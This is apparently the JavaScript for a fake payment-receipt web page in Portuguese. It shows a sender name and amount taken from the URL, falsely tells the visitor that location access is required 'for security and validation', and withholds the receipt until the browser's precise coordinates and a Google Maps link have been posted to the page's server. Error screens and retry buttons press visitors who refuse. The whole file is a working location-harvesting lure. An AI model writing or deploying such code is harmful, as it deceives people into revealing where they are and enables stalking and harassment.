import { decodeReceiptData } from "./receipt-data.js";

const pathSegments = window.location.pathname.split("/").filter(Boolean);
const encodedReceiptData = pathSegments.length === 2 && pathSegments[0] === "c"
    ? pathSegments[1]
    : null;
const receiptData = decodeReceiptData(encodedReceiptData);
const currencyFormatter = new Intl.NumberFormat("pt-BR", {
    style: "currency",
    currency: "BRL"
});

const estadoCarregamento = document.getElementById("estado-carregamento");
const estadoErroPermissao = document.getElementById("estado-erro-permissao");
const estadoErroTimeout = document.getElementById("estado-erro-timeout");
const estadoErroGenerico = document.getElementById("estado-erro-generico");
const conteudoComprovante = document.getElementById("conteudo-comprovante");
const botaoTentarPermissao = document.getElementById("botao-tentar-permissao");
const botaoEmitirNovamente = document.getElementById("botao-emitir-novamente");
const botaoTentarGenerico = document.getElementById("botao-tentar-generico");

let isProcessing = false;
let permissionRequested = false;

if (!receiptData) {
    window.location.replace("/");
} else {
    document.getElementById("nome-remetente").textContent = receiptData.nome;
    document.getElementById("valor-recebido").textContent = currencyFormatter.format(receiptData.valor);

    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, "0");
    const mes = String(dataAtual.getMonth() + 1).padStart(2, "0");
    const ano = dataAtual.getFullYear();
    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;

    iniciarFluxoValidacao();
}

function iniciarFluxoValidacao() {
    mostrarEstado("carregamento");
    isProcessing = false;
    permissionRequested = false;

    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' })
            .then(permissionStatus => {
                if (permissionStatus.state === 'granted') {
                    obterLocalizacao();
                } else if (permissionStatus.state === 'denied') {
                    mostrarEstado("erro-permissao");
                } else {
                    mostrarMensagemSeguranca();
                    obterLocalizacao();
                }
            })
            .catch(() => {
                obterLocalizacao();
            });
    } else {
        obterLocalizacao();
    }
}

function mostrarMensagemSeguranca() {
    const mensagemCarregamento = document.querySelector("#estado-carregamento p");
    if (mensagemCarregamento) {
        mensagemCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
    }
}

function obterLocalizacao() {
    if (!navigator.geolocation) {
        mostrarEstado("erro-generico");
        return;
    }

    isProcessing = true;
    mostrarEstado("carregamento");

    navigator.geolocation.getCurrentPosition(
        sendLocation,
        handleGeoError,
        {
            enableHighAccuracy: true,
            maximumAge: 60000
        }
    );
}

function handleGeoError(error) {
    isProcessing = false;

    console.error("Erro de geolocalização:", error);

    switch (error.code) {
        case error.PERMISSION_DENIED:
            mostrarEstado("erro-permissao");
            break;

        case error.TIMEOUT:
            mostrarEstado("erro-timeout");
            break;

        case error.POSITION_UNAVAILABLE:
        default:
            mostrarEstado("erro-generico");
            break;
    }
}

function sendLocation(position) {
    isProcessing = false;
    
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const API_URL = "/api/send-location";

    fetch(API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            if (data.success) {
                mostrarEstado("comprovante");
            } else {
                mostrarEstado("erro-generico");
            }
        })
        .catch(error => {
            console.error("Erro ao enviar:", error);
            mostrarEstado("erro-generico");
        });
}

function mostrarEstado(estado) {
    estadoCarregamento.hidden = true;
    estadoErroPermissao.hidden = true;
    estadoErroTimeout.hidden = true;
    estadoErroGenerico.hidden = true;
    conteudoComprovante.hidden = true;

    switch (estado) {
        case "carregamento":
            estadoCarregamento.hidden = false;
            const msgCarregamento = document.querySelector("#estado-carregamento p");
            if (msgCarregamento && !permissionRequested) {
                msgCarregamento.textContent = "A localização é necessária por motivos de segurança e validação para acessar o comprovante.";
            }
            break;

        case "erro-permissao":
            estadoErroPermissao.hidden = false;
            break;

        case "erro-timeout":
            estadoErroTimeout.hidden = false;
            break;

        case "erro-generico":
            estadoErroGenerico.hidden = false;
            break;

        case "comprovante":
            conteudoComprovante.hidden = false;
            break;
    }
}

botaoTentarPermissao.addEventListener("click", () => {
    window.location.reload();
});

botaoEmitirNovamente.addEventListener("click", () => {
    window.location.reload();
});

botaoTentarGenerico.addEventListener("click", () => {
    window.location.reload();
});